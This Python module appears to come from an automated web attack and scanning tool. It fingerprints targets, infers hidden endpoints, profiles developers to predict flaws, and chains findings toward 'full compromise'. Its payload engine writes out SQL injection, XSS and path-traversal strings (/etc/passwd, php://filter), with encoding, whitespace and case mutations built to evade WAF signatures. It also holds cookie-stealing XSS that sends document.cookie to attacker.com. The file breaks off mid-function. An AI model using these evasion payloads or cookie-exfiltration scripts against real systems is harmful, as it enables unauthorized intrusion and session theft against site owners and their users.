"""Unreplicable cognitive capabilities -- what no tool has ever formalized.

These aren't "better scanning." These are cognitive patterns from elite
human researchers that have never been codified into software:

1. ResponseTopologyMapper: Map the target's entire BEHAVIOR space.
   Not "what does this endpoint return" but "how does this system
   behave across hundreds of input variations?" Every target has a
   unique behavioral fingerprint.

2. SemanticMutationEngine: WAFs match STRINGS. We reason about
   MEANING. Generate infinite unique payloads that are semantically
   equivalent but structurally unrecognizable. Not from lists --
   from understanding what the payload DOES.

3. AttackChainSynthesizer: Individual findings are noise. Chains
   are signal. Build a graph of findings and discover paths from
   "info disclosure" to "full compromise" that no human analyst
   would connect across 50+ findings.

4. InverseSurfaceMapper: Map what's HIDDEN by reasoning from what's
   visible. If /api/v1/users exists, /api/v1/admin probably does too.
   Infer the full architecture from fragments.

5. DeveloperEmpathyEngine: Model the HUMAN who built the target.
   Their framework choice reveals their experience. Their error
   messages reveal their care level. Their API patterns reveal
   their architecture knowledge. Find the developer, find the flaw.

BACKGROUND PATH ONLY -- never import in hot path
"""

from __future__ import annotations

import hashlib
import re
import statistics
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any

from app.core.logging import get_logger

logger = get_logger(__name__)


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class TopologyPoint:
    """One data point in the response topology."""
    input_variation: str  # What we changed
    url: str
    method: str
    status_code: int
    body_length: int
    response_time_ms: int
    header_signature: str  # Hash of sorted header keys
    content_type: str
    has_body: bool


@dataclass
class TopologyMap:
    """Behavioral fingerprint of a target."""
    target: str
    points: list[TopologyPoint] = field(default_factory=list)
    status_distribution: dict[int, int] = field(default_factory=dict)
    timing_profile: dict[str, float] = field(default_factory=dict)
    hidden_states: list[dict[str, Any]] = field(default_factory=list)
    auth_boundaries: list[str] = field(default_factory=list)
    anomalies: list[str] = field(default_factory=list)


@dataclass
class SemanticPayload:
    """A semantically equivalent payload variant."""
    original_intent: str  # What the payload MEANS
    payload: str  # The actual string
    technique: str  # How it was generated
    evasion_type: str  # What it evades ("signature", "regex", "length", "encoding")


@dataclass
class AttackChain:
    """A chain of findings that escalates severity."""
    chain_id: str
    findings: list[dict[str, Any]]  # Ordered findings in the chain
    entry_point: str  # Where the chain starts
    impact: str  # What the chain achieves
    severity: str  # Combined severity ("critical", "high", etc.)
    reasoning: str  # Why this chain works
    probability: float = 0.5  # Likelihood of successful exploitation


@dataclass
class InferredEndpoint:
    """An endpoint inferred to exist from visible patterns."""
    url: str
    inferred_from: list[str]  # URLs that suggested this exists
    confidence: float
    reasoning: str
    category: str  # "api", "admin", "auth", "data", "config"


@dataclass
class DeveloperProfile:
    """Profile of the developer/team behind a target."""
    experience_level: str  # "junior", "mid", "senior", "team"
    primary_framework: str
    likely_mistakes: list[str] = field(default_factory=list)
    architecture_style: str = ""  # "monolith", "microservice", "serverless"
    security_awareness: str = ""  # "low", "medium", "high"
    indicators: dict[str, str] = field(default_factory=dict)


# ---------------------------------------------------------------------------
# 1. Response Topology Mapper
# ---------------------------------------------------------------------------

class ResponseTopologyMapper:
    """Maps the behavioral fingerprint of a target.

    Send carefully crafted variations and observe how the target
    responds differently. The PATTERN of responses reveals:
    - Hidden state machines (session-dependent behavior)
    - Auth boundaries (where 200 becomes 401/403)
    - Business logic gates (where behavior changes based on input)
    - Rate limit thresholds (where timing changes)
    - WAF behavior (where responses become uniform)

    A target behind Cloudflare + nginx + Django has a completely
    different topology than one behind AWS ALB + Express. The
    topology IS the fingerprint.
    """

    # Probe variations to map the response space
    TOPOLOGY_PROBES: list[dict[str, Any]] = [
        # Method variations
        {"variation": "method_get", "method": "GET", "path": "/"},
        {"variation": "method_head", "method": "HEAD", "path": "/"},
        {"variation": "method_options", "method": "OPTIONS", "path": "/"},
        {"variation": "method_post", "method": "POST", "path": "/"},
        {"variation": "method_put", "method": "PUT", "path": "/"},
        {"variation": "method_delete", "method": "DELETE", "path": "/"},
        {"variation": "method_patch", "method": "PATCH", "path": "/"},
        {"variation": "method_trace", "method": "TRACE", "path": "/"},
        # Path variations
        {"variation": "path_root", "method": "GET", "path": "/"},
        {"variation": "path_nonexistent", "method": "GET", "path": "/a8f3k2j4h5"},
        {"variation": "path_dotdot", "method": "GET", "path": "/../"},
        {"variation": "path_double_slash", "method": "GET", "path": "//"},
        {"variation": "path_null_byte", "method": "GET", "path": "/%00"},
        {"variation": "path_long", "method": "GET", "path": "/" + "a" * 500},
        {"variation": "path_unicode", "method": "GET", "path": "/%E2%80%8B"},  # Zero-width space
        {"variation": "path_api_root", "method": "GET", "path": "/api"},
        {"variation": "path_api_v1", "method": "GET", "path": "/api/v1"},
        {"variation": "path_api_v2", "method": "GET", "path": "/api/v2"},
        # Header variations
        {"variation": "header_no_ua", "method": "GET", "path": "/", "headers": {"User-Agent": ""}},
        {"variation": "header_bot_ua", "method": "GET", "path": "/", "headers": {"User-Agent": "Googlebot/2.1"}},
        {"variation": "header_curl_ua", "method": "GET", "path": "/", "headers": {"User-Agent": "curl/7.88.0"}},
        {"variation": "header_accept_json", "method": "GET", "path": "/", "headers": {"Accept": "application/json"}},
        {"variation": "header_accept_xml", "method": "GET", "path": "/", "headers": {"Accept": "application/xml"}},
        # Auth probes
        {"variation": "auth_empty_bearer", "method": "GET", "path": "/", "headers": {"Authorization": "Bearer "}},
        {"variation": "auth_basic_admin", "method": "GET", "path": "/", "headers": {"Authorization": "Basic YWRtaW46YWRtaW4="}},
        {"variation": "auth_fake_cookie", "method": "GET", "path": "/", "headers": {"Cookie": "session=test"}},
    ]

    def build_topology(self, responses: list[dict[str, Any]]) -> TopologyMap:
        """Build a behavioral topology from collected probe responses.

        The caller should execute the TOPOLOGY_PROBES against the target
        and pass the results here. Each response dict should have:
        - variation: which probe this was
        - status_code, body_length, response_time_ms, headers, content_type
        """
        tmap = TopologyMap(target=responses[0].get("url", "") if responses else "")
        points = []

        for resp in responses:
            headers = resp.get("headers", {})
            header_keys = sorted(k.lower() for k in headers.keys()) if isinstance(headers, dict) else []
            header_sig = hashlib.md5(",".join(header_keys).encode()).hexdigest()[:8]

            point = TopologyPoint(
                input_variation=resp.get("variation", ""),
                url=resp.get("url", ""),
                method=resp.get("method", "GET"),
                status_code=resp.get("status_code", 0),
                body_length=resp.get("body_length", 0),
                response_time_ms=resp.get("response_time_ms", 0),
                header_signature=header_sig,
                content_type=resp.get("content_type", headers.get("content-type", "") if isinstance(headers, dict) else ""),
                has_body=resp.get("body_length", 0) > 0,
            )
            points.append(point)

        tmap.points = points

        # Analyze the topology
        self._analyze_status_distribution(tmap)
        self._analyze_timing(tmap)
        self._detect_hidden_states(tmap)
        self._detect_auth_boundaries(tmap)
        self._detect_anomalies(tmap)

        return tmap

    def _analyze_status_distribution(self, tmap: TopologyMap) -> None:
        dist: dict[int, int] = defaultdict(int)
        for p in tmap.points:
            dist[p.status_code] += 1
        tmap.status_distribution = dict(dist)

    def _analyze_timing(self, tmap: TopologyMap) -> None:
        times = [p.response_time_ms for p in tmap.points if p.response_time_ms > 0]
        if not times:
            return
        tmap.timing_profile = {
            "mean_ms": statistics.mean(times),
            "median_ms": statistics.median(times),
            "stdev_ms": statistics.stdev(times) if len(times) > 1 else 0,
            "min_ms": min(times),
            "max_ms": max(times),
        }

    def _detect_hidden_states(self, tmap: TopologyMap) -> None:
        """Detect when the same path returns different results based on other inputs.

        This reveals session state, A/B testing, load balancing across
        different backends, or race conditions.
        """
        # Group by path, check for status code variance
        by_path: dict[str, list[TopologyPoint]] = defaultdict(list)
        for p in tmap.points:
            # Normalize path from URL
            path = p.url.split("//", 1)[-1].split("/", 1)[-1] if "//" in p.url else p.url
            by_path[path].append(p)

        for path, points in by_path.items():
            statuses = set(p.status_code for p in points)
            if len(statuses) > 1:
                tmap.hidden_states.append({
                    "path": path,
                    "status_codes": sorted(statuses),
                    "insight": (
                        f"Path '/{path}' returns {len(statuses)} different status codes "
                        f"({sorted(statuses)}) depending on request variation. "
                        f"This reveals input-dependent behavior."
                    ),
                })

        # Check header signature variance (different middleware responses)
        sigs = set(p.header_signature for p in tmap.points)
        if len(sigs) > 2:
            tmap.hidden_states.append({
                "type": "header_variance",
                "unique_signatures": len(sigs),
                "insight": (
                    f"{len(sigs)} distinct header signature patterns detected. "
                    f"Multiple backends or middleware stacks responding."
                ),
            })

    def _detect_auth_boundaries(self, tmap: TopologyMap) -> None:
        """Find where responses change from 200 to 401/403."""
        for p in tmap.points:
            if p.status_code in (401, 403):
                if "auth" in p.input_variation or "cookie" in p.input_variation:
                    tmap.auth_boundaries.append(
                        f"{p.input_variation}: {p.status_code} -- auth boundary detected"
                    )
                elif p.input_variation.startswith("path_api"):
                    tmap.auth_boundaries.append(
                        f"{p.input_variation}: {p.status_code} -- API requires authentication"
                    )

    def _detect_anomalies(self, tmap: TopologyMap) -> None:
        """Find responses that don't fit the pattern."""
        if not tmap.timing_profile:
            return

        mean = tmap.timing_profile.get("mean_ms", 0)
        stdev = tmap.timing_profile.get("stdev_ms", 0)

        if stdev == 0:
            return

        for p in tmap.points:
            if p.response_time_ms > 0:
                z_score = (p.response_time_ms - mean) / stdev if stdev > 0 else 0
                if abs(z_score) > 2:
                    tmap.anomalies.append(
                        f"{p.input_variation}: {p.response_time_ms}ms "
                        f"(z={z_score:.1f}) -- timing anomaly, "
                        f"different code path or heavy processing"
                    )

        # Body size anomalies
        sizes = [p.body_length for p in tmap.points if p.body_length > 0]
        if len(sizes) >= 3:
            mean_size = statistics.mean(sizes)
            for p in tmap.points:
                if p.body_length > mean_size * 5 and p.body_length > 1000:
                    tmap.anomalies.append(
                        f"{p.input_variation}: body {p.body_length} bytes "
                        f"(5x+ average) -- unusually large response, possible data leak"
                    )


# ---------------------------------------------------------------------------
# 2. Semantic Mutation Engine
# ---------------------------------------------------------------------------

class SemanticMutationEngine:
    """Generates semantically equivalent payload variants.

    WAFs match STRINGS. We reason about MEANING.

    "' OR 1=1--" means "always-true SQL condition that comments out the rest."
    The WAF blocks that exact string. But it can't block all strings
    that MEAN the same thing, because there are infinitely many.

    Categories of semantic mutation:
    - Algebraic equivalence: 1=1 -> 2>1 -> 'a'='a' -> 1<2
    - Encoding variance: plain -> URL encode -> double encode -> Unicode
    - Whitespace manipulation: OR -> O R -> OR/**/ -> OR%09
    - Case mixing: UNION -> UnIoN -> union -> uNiOn
    - Comment injection: SELECT/**/version() -> SELECT%0Aversion()
    - Function equivalence: version() -> @@version -> pg_version()
    - Logic equivalence: AND -> && -> & (bitwise in some contexts)
    """

    def mutate_sql_injection(self, intent: str = "always_true") -> list[SemanticPayload]:
        """Generate SQL injection payload variants for a given intent."""
        payloads = []

        if intent == "always_true":
            # The MEANING: a condition that always evaluates to true
            algebraic = [
                "' OR 1=1--",
                "' OR 2>1--",
                "' OR 'a'='a'--",
                "' OR 1<2--",
                "' OR 'x' LIKE 'x'--",
                "' OR 1 BETWEEN 0 AND 2--",
                "' OR 1 IN (1,2,3)--",
                "' OR ASCII('a')=97--",
                "' OR LENGTH('a')>0--",
                "' OR SUBSTR('a',1,1)='a'--",
            ]
            for p in algebraic:
                payloads.append(SemanticPayload(
                    original_intent="always_true_condition",
                    payload=p,
                    technique="algebraic_equivalence",
                    evasion_type="signature",
                ))

            # Encoding mutations of the first payload
            base = "' OR 1=1--"
            payloads.extend(self._encoding_mutations(base, "always_true_condition"))

            # Whitespace mutations
            payloads.extend(self._whitespace_mutations(base, "always_true_condition"))

            # Case mutations
            payloads.extend(self._case_mutations(base, "always_true_condition"))

        elif intent == "union_select":
            bases = [
                "' UNION SELECT NULL--",
                "' UNION ALL SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' /*!UNION*/ SELECT NULL--",
                "' UNION%0ASELECT%0ANULL--",
                "' uNiOn SeLeCt NULL--",
            ]
            for p in bases:
                payloads.append(SemanticPayload(
                    original_intent="union_based_extraction",
                    payload=p,
                    technique="syntax_variation",
                    evasion_type="signature",
                ))

        elif intent == "version_extract":
            # Different DBs have different version functions
            variants = [
                ("' UNION SELECT version()--", "postgresql/mysql"),
                ("' UNION SELECT @@version--", "mssql/mysql"),
                ("' UNION SELECT sqlite_version()--", "sqlite"),
                ("' UNION SELECT banner FROM v$version--", "oracle"),
                ("' UNION SELECT pg_catalog.version()--", "postgresql"),
            ]
            for payload, db in variants:
                payloads.append(SemanticPayload(
                    original_intent="database_version_extraction",
                    payload=payload,
                    technique=f"db_specific_{db}",
                    evasion_type="signature",
                ))

        elif intent == "time_based_blind":
            variants = [
                ("' AND SLEEP(5)--", "mysql"),
                ("' AND pg_sleep(5)--", "postgresql"),
                ("'; WAITFOR DELAY '0:0:5'--", "mssql"),
                ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "mysql_subquery"),
                ("' || pg_sleep(5)--", "postgresql_concat"),
            ]
            for payload, tech in variants:
                payloads.append(SemanticPayload(
                    original_intent="time_based_blind_sqli",
                    payload=payload,
                    technique=tech,
                    evasion_type="signature",
                ))

        return payloads

    def mutate_xss(self, intent: str = "alert") -> list[SemanticPayload]:
        """Generate XSS payload variants."""
        payloads = []

        if intent == "alert":
            # The MEANING: execute JavaScript to prove XSS
            variants = [
                ("<script>alert(1)</script>", "classic_script_tag"),
                ("<img src=x onerror=alert(1)>", "img_onerror"),
                ("<svg onload=alert(1)>", "svg_onload"),
                ("<body onload=alert(1)>", "body_onload"),
                ("<input onfocus=alert(1) autofocus>", "input_autofocus"),
                ("<details open ontoggle=alert(1)>", "details_ontoggle"),
                ("<marquee onstart=alert(1)>", "marquee_onstart"),
                ("<video><source onerror=alert(1)>", "video_source"),
                ("javascript:alert(1)//", "javascript_proto"),
                ("<iframe src='javascript:alert(1)'>", "iframe_js"),
            ]
            for payload, technique in variants:
                payloads.append(SemanticPayload(
                    original_intent="javascript_execution_proof",
                    payload=payload,
                    technique=technique,
                    evasion_type="signature",
                ))

            # Encoding variants of the first
            payloads.extend(self._encoding_mutations(
                "<script>alert(1)</script>",
                "javascript_execution_proof",
            ))

        elif intent == "cookie_theft":
            variants = [
                ("<script>new Image().src='//attacker.com/?c='+document.cookie</script>", "img_exfil"),
                ("<script>fetch('//attacker.com/?c='+document.cookie)</script>", "fetch_exfil"),
                ("<img src=x onerror=fetch('//a.com/?c='+document.cookie)>", "img_fetch"),
            ]
            for payload, technique in variants:
                payloads.append(SemanticPayload(
                    original_intent="cookie_exfiltration",
                    payload=payload,
                    technique=technique,
                    evasion_type="signature",
                ))

        return payloads

    def mutate_path_traversal(self) -> list[SemanticPayload]:
        """Generate path traversal variants."""
        # The MEANING: navigate up the directory tree
        payloads = []
        variants = [
            ("../../../etc/passwd", "classic_dotdot", "signature"),
            ("..\\..\\..\\etc\\passwd", "backslash", "signature"),
            ("....//....//....//etc/passwd", "double_dot_double_slash", "regex"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded", "encoding"),
            ("%252e%252e%252f", "double_url_encoded", "encoding"),
            ("..%c0%af..%c0%afetc/passwd", "overlong_utf8", "encoding"),
            ("/proc/self/environ", "proc_self", "signature"),
            ("php://filter/read=convert.base64-encode/resource=index.php", "php_filter", "signature"),
        ]
        for payload, technique, evasion in variants:
            payloads.append(SemanticPayload(
                original_intent="directory_traversal",
                payload=payload,
                technique=technique,
                evasion_type=evasion,
            ))
        return payloads

    def _encoding_mutations(self, base: str, intent: str) -> list[SemanticPayload]:
        """Generate encoding variants of a payload."""
        payloads = []

        # URL encoding
        url_encoded = "".join(f"%{ord(c):02X}" if not c.isalnum() else c for c in base)
        payloads.append(SemanticPayload(
            original_intent=intent,
            payload=url_encoded,
            technique="url_encoding",
            evasion_type="encoding",
        ))

        # Double URL encoding
        double = "".join(
            f"%25{ord(c):02X}" if not c.isalnum() else c for c in base
        )
        payloads.append(SemanticPayload(
            original_intent=intent,
            payload=double,
            technique="double_url_encoding",
            evasion_type="encoding",
        ))

        # HTML entity encoding (for reflected contexts)
        html = "".join(f"&#{ord(c)};" for c in base)
        payloads.append(SemanticPayload(
            original_intent=intent,
            payload=html,
            technique="html_entity_encoding",
            evasion_type="encoding",
        ))

        return payloads

    def _whitespace_mutations(self, base: str, intent: str) -> list[SemanticPayload]:
        """Generate whitespace variants (SQL comment bypass, tab substitution)."""
        payloads = []

        # Replace spaces with SQL comments
        comment_space = base.replace(" ", "/**/")
        payloads.append(SemanticPayload(
            original_intent=intent,
            payload=comment_space,
            technique="sql_comment_whitespace",
            evasion_type="signature",
        ))

        # Replace spaces with tabs
        tab_space = base.replace(" ", "\t")
        payloads.append(SemanticPayload(
            original_intent=intent,
            payload=tab_space,
            technique="tab_whitespace",
            evasion_type="signature",
        ))

        # Replace spaces with newlines
        newline_space = base.replace(" ", "\n")
        payloads.append(SemanticPayload(
            original_intent=intent,
            payload=newline_space,
            technique="newline_whitespace",
            evasion_type="signature",
        ))

        return payloads

    def _case_mutations(self, base: str, intent: str) -> list[SemanticPayload]:
        """Generate case-mixed variants."""
        payloads = []

        # Alternating case
        alt = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(base))
        payloads.append(SemanticPayload(
            original_intent=intent,
            payload=alt,
            technique="alternating_case",
            evasion_type="signature",
        ))

        # Random-looking but deterministic case mixing for SQL keywords
        mixed = base
        for keyword in ["OR", "AND", "SELECT", "UNION", "FROM", "WHERE"]:
            if keyword in base.upper():
                idx = base.upper().index(keyword)
                replacement = "".join(
                    c.upper() if j % 3 == 0 else c.lower()
                    for j, c in enumerate(keyword)
                )
                mixed = mixed[:idx] + replacement + mixed[idx + len(keyword):]
        if mixed != base:
            payloads.append(SemanticPayload(
                original_intent=intent,
                payload=mixed,
                technique="keyword_case_mixing",
                evasion_type="signature",
            ))

        return payloads


# ---------------------------------------------------------------------------
# 3. Attack Chain Synthesizer
# ---------------------------------------------------------------------------

class AttackChainSynthesizer:
    """Discovers attack chains by connecting individual findings.

    A missing HSTS header alone = informational.
    An exposed debug endpoint alone = low.
    A leaked admin token alone = medium.

    Missing HSTS + exposed debug endpoint + leaked admin token
    = chain: downgrade to HTTP (no HSTS) -> intercept debug traffic ->
    extract token -> authenticate as admin = CRITICAL.

    The synthesizer builds a graph of findings and discovers paths
    through it that escalate severity.
    """

    # Chain patterns: (prerequisite_type, enables_type, combined_severity)
    _CHAIN_PATTERNS: list[dict[str, Any]] = [
        {
            "name": "credential_to_access",
            "requires": ["credential_exposure", "post_exploitation"],
            "enables": "authenticated_access",
            "severity": "critical",
            "template": "Leaked credentials from {source} used to authenticate at {target}",
        },
        {
            "name": "info_disclosure_to_targeted_exploit",
            "requires": ["header_analysis", "vulnerability_verification"],
            "enables": "targeted_exploitation",
            "severity": "high",
            "template": "Technology stack revealed by {source}, enabling targeted exploit at {target}",
        },
        {
            "name": "api_docs_to_data_access",
            "requires": ["api_exposure", "unauthorized_access"],
            "enables": "data_breach",
            "severity": "critical",
            "template": "API documentation at {source} revealed endpoints, unauthorized access at {target}",
        },
        {
            "name": "path_to_credential_to_lateral",
            "requires": ["path_discovery", "credential_exposure", "database_exposure"],
            "enables": "lateral_movement",
            "severity": "critical",
            "template": "Exposed path at {path} leaked credentials, used to access database",
        },
        {
            "name": "subdomain_to_staging_to_prod",
            "requires": ["ct_log", "path_discovery"],
            "enables": "staging_access",
            "severity": "high",
            "template": "CT logs revealed staging subdomain, path discovery found exposed endpoints",
        },
        {
            "name": "missing_headers_to_mitm",
            "requires": ["header_analysis"],
            "enables": "downgrade_attack",
            "severity": "medium",
            "template": "Missing security headers enable protocol downgrade and session hijacking",
        },
        {
            "name": "idor_chain",
            "requires": ["compositional_discovery", "unauthorized_access"],
            "enables": "mass_data_access",
            "severity": "critical",
            "template": "Resource enumeration combined with access control bypass enables mass data extraction",
        },
    ]

    def synthesize(self, findings: list[dict[str, Any]]) -> list[AttackChain]:
        """Discover attack chains from a set of findings.

        Builds a graph of findings connected by their types,
        then searches for paths that match known chain patterns.
        """
        if len(findings) < 2:
            return []

        chains: list[AttackChain] = []

        # Index findings by type
        by_type: dict[str, list[dict[str, Any]]] = defaultdict(list)
        for f in findings:
            ftype = f.get("type", "")
            by_type[ftype].append(f)
            # Also index by exploit_plan category if present
            plan = f.get("exploit_plan", {})
            if plan.get("impact_category"):
                by_type[plan["impact_category"]].append(f)
            # Also index by chained_from
            if f.get("chained_from"):
                by_type[f["chained_from"]].append(f)

        # Match chain patterns
        for pattern in self._CHAIN_PATTERNS:
            required_types = pattern["requires"]
            # Check if all required types have findings
            if all(by_type.get(rt) for rt in required_types):
                # Build the chain from matching findings
                chain_findings = []
                for rt in required_types:
                    chain_findings.append(by_type[rt][0])  # Take first match

                # Build description
                source = chain_findings[0].get("url", chain_findings[0].get("type", ""))
                target = chain_findings[-1].get("url", chain_findings[-1].get("type", ""))

                chain = AttackChain(
                    chain_id=f"chain_{pattern['name']}",
                    findings=chain_findings,
                    entry_point=source,
                    impact=pattern["enables"],
                    severity=pattern["severity"],
                    reasoning=pattern["template"].format(
                        source=source,
                        target=target,
                        path=source,
                    ),
                    probability=min(
                        0.9,
                        0.3 + 0.2 * len(chain_findings),
                    ),
                )
                chains.append(chain)

        # Sort by severity (critical > high > medium > low)
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        chains.sort(key=lambda c: severity_order.get(c.severity, 4))

        return chains


# ---------------------------------------------------------------------------
# 4. Inverse Surface Mapper
# ---------------------------------------------------------------------------

class InverseSurfaceMapper:
    """Infers hidden endpoints from visible patterns.

    If you find /api/v1/users and /api/v1/orders, then
    /api/v1/payments, /api/v1/products, /api/v1/sessions
    probably exist. Map what's HIDDEN.

    Pattern types:
    - Version inference: /api/v1/ exists -> /api/v2/ likely exists
    - Resource inference: /users, /orders -> /products, /payments
    - Convention inference: /api/docs -> /api/swagger.json, /api/openapi.yaml
    - Admin inference: /admin -> /admin/login, /admin/users, /admin/settings
    - Auth inference: /login -> /register, /forgot-password, /oauth, /logout
    """

    # Common resource siblings
    _RESOURCE_FAMILIES: dict[str, list[str]] = {
        "users": ["accounts", "profiles", "roles", "permissions", "sessions", "auth"],
        "orders": ["payments", "invoices", "subscriptions", "products", "cart", "checkout"],
        "products": ["categories", "inventory", "reviews", "pricing", "catalog"],
        "posts": ["comments", "categories", "tags", "media", "authors"],
        "admin": ["dashboard", "settings", "users", "logs", "config", "analytics"],
        "auth": ["login", "register", "logout", "forgot-password", "reset-password", "oauth", "token", "refresh"],
        "api": ["docs", "swagger.json", "openapi.json", "openapi.yaml", "graphql", "health", "status", "version"],
    }

    # Common version patterns
    _VERSION_PATTERNS: list[str] = ["v1", "v2", "v3", "v4"]

    def infer_endpoints(
        self,
        known_urls: list[str],
        known_paths: list[str] | None = None,
    ) -> list[InferredEndpoint]:
        """Infer hidden endpoints from known ones."""
        inferred: list[InferredEndpoint] = []
        known_set = set(known_urls + (known_paths or []))

        # Extract base URL and known path segments
        base_url = ""
        path_segments: set[str] = set()

        for url in known_urls:
            if "://" in url:
                parts = url.split("://", 1)
                base_url = parts[0] + "://" + parts[1].split("/")[0]
            path = url.split("://", 1)[-1].split("/", 1)[-1] if "://" in url else url
            for segment in path.strip("/").split("/"):
                if segment:
                    path_segments.add(segment.lower())

        if not base_url:
            base_url = "https://target"

        # Infer from resource families
        for segment in list(path_segments):
            for family_key, siblings in self._RESOURCE_FAMILIES.items():
                if segment == family_key or segment in siblings:
                    # Find the API prefix from known URLs
                    prefix = self._find_prefix(known_urls, segment)
                    for sibling in siblings:
                        if sibling != segment and sibling not in path_segments:
                            candidate = f"{base_url}{prefix}/{sibling}" if prefix else f"{base_url}/{sibling}"
                            if candidate not in known_set:
                                inferred.append(InferredEndpoint(
                                    url=candidate,
                                    inferred_from=[url for url in known_urls if segment in url][:2],
                                    confidence=0.6,
                                    reasoning=f"'{segment}' and '{sibling}' are commonly co-located resources",
                                    category="api" if prefix and "api" in prefix else "data",
                                ))

        # Infer version variants
        for url in known_urls:
            for i, ver in enumerate(self._VERSION_PATTERNS):
                if f"/{ver}/" in url or url.endswith(f"/{ver}"):
                    for other_ver in self._VERSION_PATTERNS:
                        if other_ver != ver:
                            candidate = url.replace(f"/{ver}", f"/{other_ver}")
                            if candidate not in known_set:
                                inferred.append(InferredEndpoint(
                                    url=candidate,
                                    inferred_from=[url],
                                    confidence=0.4 if other_ver > ver else 0.7,
                                    reasoning=f"API version {ver} exists, {other_ver} likely deployed",
                                    category="api",
                                ))

        # Deduplicate by URL
        seen: set[str] = set()
        unique: list[InferredEndpoint] = []
        for ep in inferred:
            if ep.url not in seen:
                seen.add(ep.url)
                unique.append(ep)

        # Sort by confidence descending
        unique.sort(key=lambda e: -e.confidence)
        return unique[:30]  # Cap at 30 inferences

    def _find_prefix(self, urls: list[str], segment: str) -> str:
        """Find the URL path prefix before a given segment."""
        for url in urls:
            path = url.split("://", 1)[-1].split("/", 1)[-1] if "://" in url else url
            parts = path.strip("/").split("/")
            for i, part in enumerate(parts):
                if part.lower() == segment:
                    return "/" + "/".join(parts[:i]) if i > 0 else ""
        return ""


# ---------------------------------------------------------------------------
# 5. Developer Empathy Engine
# ---------------------------------------------------------------------------

class DeveloperEmpathyEngine:
    """Models the developer/team behind a target to predict vulnerabilities.

    Framework choice, error handling quality, API design patterns, and
    response header configuration all reveal the developer's experience
    and security awareness. Junior devs make different mistakes than
    senior devs. Startups cut different corners than enterprises.

    This is how elite researchers find zero-days: they study the
    PEOPLE, not just the system.
    """

    # Framework-specific vulnerability patterns
    _FRAMEWORK_VULNS: dict[str, list[str]] = {
        "django": [
            "Debug mode left on in production (DEBUG=True)",
            "Admin panel at /admin/ with default credentials",
            "CSRF token not validated on API endpoints",
            "SECRET_KEY in environment or hardcoded",
            "SQL injection in raw() or extra() queries",
            "Template injection in user-controlled template strings",
        ],
        "express/nodejs": [
            "Prototype pollution via JSON body parsing",
            "NoSQL injection in MongoDB queries",
            "Path traversal via improper join() usage",
            "Server-side template injection (SSTI) in EJS/Pug",
            "JWT secret in source code or weak signing",
            "Missing rate limiting on auth endpoints",
        ],
        "flask": [
            "Debug mode with Werkzeug debugger (RCE via PIN)",
            "SSTI in Jinja2 templates",
            "Insecure session cookies (client-side, predictable secret)",
            "Missing CSRF protection",
            "SQL injection via raw string formatting",
        ],
        "laravel": [
            "APP_DEBUG=true in production (.env exposed)",
            "Deserialization attacks via cookie encryption",
            "Mass assignment via fillable/guarded misconfiguration",
            "Default APP_KEY in source code",
            "SQL injection in whereRaw() calls",
        ],
        "spring/java": [
            "Spring Boot Actuator endpoints exposed (/actuator, /env, /heapdump)",
            "Expression Language injection (SpEL)",
            "Deserialization via Java ObjectInputStream",
            "JNDI injection (Log4Shell pattern)",
            "Default H2 console at /h2-console",
        ],
        "asp.net": [
            "ViewState deserialization attacks",
            "IIS short filename disclosure (8.3)",
            "Stack traces with full paths in errors",
            "Default ELMAH error logging endpoint",
            "Web.config accessible",
        ],
        "ruby_on_rails": [
            "Mass assignment via attr_accessible misconfiguration",
            "YAML deserialization (CVE-2013-0156 pattern)",
            "SQL injection in where() with string interpolation",
            "Default secret_key_base in source",
            "ActionCable WebSocket auth bypass",
        ],
        "fastapi": [
            "Auto-generated /docs and /redoc endpoints exposed",
            "Pydantic validation bypass via type coercion",
            "CORS wildcard in production",
            "Missing auth on auto-generated OpenAPI endpoints",
        ],
    }

    # Experience indicators
    _EXPERIENCE_SIGNALS: dict[str, dict[str, str]] = {
        "junior": {
            "generic_errors": "Returns generic 500 errors with stack traces",
            "no_rate_limit": "No rate limiting on any endpoint",
            "cors_wildcard": "CORS set to * in production",
            "debug_on": "Debug mode enabled in production",
            "default_creds": "Default credentials not changed",
            "sequential_ids": "Sequential integer IDs (IDOR-prone)",
        },
        "mid": {
            "partial_headers": "Some security headers but not all (HSTS missing, CSP missing)",
            "inconsistent_auth": "Auth on some endpoints but not others",
            "verbose_errors": "Custom error pages but still leaking info in JSON",
            "basic_rate_limit": "Rate limiting present but easily bypassed",
        },
        "senior": {
            "security_headers": "Full security header suite (HSTS, CSP, X-Frame, etc.)",
            "consistent_auth": "Consistent auth across all endpoints",
            "opaque_errors": "Opaque error messages with no stack traces",
            "uuid_ids": "UUID identifiers (not sequential)",
            "rate_limit_advanced": "Per-endpoint rate limiting with headers",
        },
    }

    def profile_developer(
        self,
        technologies: list[str],
        response_headers: dict[str, str],
        error_patterns: list[str],
        api_patterns: list[str] | None = None,
        target_type: str = "",
    ) -> DeveloperProfile:
        """Build a developer profile from observed target behavior."""
        profile = DeveloperProfile(
            experience_level="unknown",
            primary_framework="unknown",
        )

        # Identify framework
        for tech in technologies:
            tech_lower = tech.lower()
            for framework in self._FRAMEWORK_VULNS:
                if framework.split("/")[0] in tech_lower:
                    profile.primary_framework = framework
                    profile.likely_mistakes = list(self._FRAMEWORK_VULNS[framework])
                    break

        # Assess experience level from response headers
        headers_lower = {k.lower(): v for k, v in response_headers.items()}
        experience_score = 0
        total_checks = 0

        # Security headers present?
        security_headers = [
            "strict-transport-security",
            "content-security-policy",
            "x-frame-options",
            "x-content-type-options",
            "x-xss-protection",
            "referrer-policy",
        ]
        for h in security_headers:
            total_checks += 1
            if h in headers_lower:
                experience_score += 1
                profile.indicators[h] = "present"
            else:
                profile.indicators[f"missing_{h}"] = "absent"

        # Error handling quality
        for pattern in error_patterns:
            pattern_lower = pattern.lower()
            total_checks += 1
            if "stack" in pattern_lower or "traceback" in pattern_lower:
                profile.indicators["stack_trace_exposure"] = "yes"
            elif "debug" in pattern_lower:
                profile.indicators["debug_mode"] = "yes"
            else:
                experience_score += 1

        # Assess
        if total_checks > 0:
            ratio = experience_score / total_checks
            if ratio >= 0.7:
                profile.experience_level = "senior"
                profile.security_awareness = "high"
            elif ratio >= 0.4:
                profile.experience_level = "mid"
